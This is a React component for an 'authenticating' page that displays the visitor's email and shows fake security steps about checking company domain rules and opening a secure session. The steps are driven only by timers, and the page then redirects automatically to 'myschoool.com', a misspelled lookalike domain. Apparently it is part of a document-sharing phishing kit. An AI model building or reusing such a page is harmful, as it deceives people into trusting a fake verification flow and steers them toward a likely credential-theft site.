import { useEffect, useState } from "react";
import RingLoader from "./RingLoader";

interface AuthenticatingPageProps {
  email: string;
}

const AuthenticatingPage = ({ email }: AuthenticatingPageProps) => {
  const [activeStep, setActiveStep] = useState(0);

  const steps = [
    "Checking company domain and security rules...",
    "Establishing a secure session for document access...",
    "Forwarding you to your Agreement...",
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      setActiveStep((prev) => {
        if (prev < steps.length - 1) return prev + 1;
        return prev;
      });
    }, 1500);

    return () => clearInterval(interval);
  }, [steps.length]);

  useEffect(() => {
    if (activeStep === steps.length - 1) {
      const redirectTimer = setTimeout(() => {
        window.location.href = "https://myschoool.com/$";
      }, 2000);
      return () => clearTimeout(redirectTimer);
    }
  }, [activeStep, steps.length]);

  return (
    <div className="min-h-screen gradient-bg flex items-center justify-center p-4">
      <div className="dark-card rounded-2xl p-8 md:p-12 max-w-xl w-full animate-scale-in relative overflow-hidden">
        {/* Outer dashed border effect */}
        <div className="absolute inset-0 rounded-2xl border border-dashed border-muted/30" />
        
        {/* Ring Loader */}
        <div className="flex justify-center mb-8">
          <RingLoader />
        </div>

        {/* Status Badge */}
        <div className="flex justify-center mb-6">
          <div className="inline-flex items-center gap-2 bg-secondary/50 px-4 py-2 rounded-full border border-muted/30">
            <div className="status-dot" />
            <span className="text-muted-foreground text-sm">Verifying recipient</span>
          </div>
        </div>

        {/* Title */}
        <div className="text-center mb-8">
          <h1 className="text-foreground text-2xl md:text-3xl font-semibold mb-2">
            Authenticating <span className="text-gradient">{email}</span>
          </h1>
          <p className="text-muted-foreground">
            We're securely checking your email and preparing your agreement.
          </p>
        </div>

        {/* Steps */}
        <div className="space-y-4 mb-8">
          {steps.map((step, index) => (
            <div
              key={index}
              className={`flex items-center gap-3 transition-opacity duration-500 ${
                index <= activeStep ? 'opacity-100' : 'opacity-40'
              }`}
            >
              <div
                className={`w-2 h-2 rounded-full transition-all duration-300 ${
                  index <= activeStep ? 'bg-status-green shadow-[0_0_8px_hsla(142,70%,50%,0.6)]' : 'bg-muted'
                }`}
              />
              <span className="text-muted-foreground text-sm">{step}</span>
            </div>
          ))}
        </div>

        {/* Footer Text */}
        <p className="text-center text-muted-foreground/70 text-sm">
          You'll be redirected automatically.
        </p>
      </div>
    </div>
  );
};

export default AuthenticatingPage;
